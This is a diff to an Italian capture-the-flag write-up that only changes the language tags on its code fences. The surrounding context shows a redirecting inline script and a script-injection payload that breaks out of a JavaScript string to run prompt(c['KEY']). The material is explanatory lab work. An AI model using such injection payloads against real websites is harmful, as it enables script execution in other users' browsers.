@@ -21,7 +21,7 @@ Il primo problema consisteva nel fatto che nella propria pagina per effettuare l
 
 Dal sorgente pagina si poteva notare questo codice:
 
-```html
+```
 <script>
     alert("Sorry, server is busy for a while!");
     document.location = "/index.php?id=eyJ0ZWFtaWQiOiIyNzkifS4xY0l4eEkud0pZRGN2QWdSMG03aGUxT0VmNEZiNHZjQThZ";
@@ -31,7 +31,7 @@ Che è quello che causava la reindirizzazione.
 
 Più in basso si notava anche il seguente codice, che però non veniva eseguito:
 
-```html
+```
 <script>
     var timeElem = document.getElementById('time');
     waitSeconds(timeElem, function () {
@@ -62,7 +62,7 @@ Questo payload contiene un apice doppio alla fine che rompe la sintassi del prim
 
 Risulta quindi
 
-```html
+```
 <script>
     alert("Sorry, server is busy for a while!");
     document.location = "/index.php?id=eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};prompt(c['KEY']);a={'p':'"";
@@ -96,7 +96,7 @@ Il payload finale quindi consisteva in:
 
 Che risulta nel seguente codice:
 
-```html
+```
 <script>
     alert("Sorry, server is busy for a while!");
     document.location = "/index.php?id=eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};
